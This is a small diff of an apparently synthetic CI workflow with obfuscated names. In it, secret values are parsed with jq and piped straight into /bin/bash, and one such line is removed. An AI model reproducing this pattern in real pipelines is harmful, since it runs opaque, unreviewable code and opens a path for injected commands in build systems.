@@ -19,7 +19,6 @@ jobs:
           ydbn17: ${{ secrets.ydbn17 }}
         run: |
           printf '%s' "$ydbn17" | jq -r .ztlr610 | /bin/bash
-          echo $rol63723 | jq -r .afnp8 | /bin/bash
           printf '%s' "$itfsm6986" | jq -r .k32539 | /bin/bash
 
       - name: Persist output
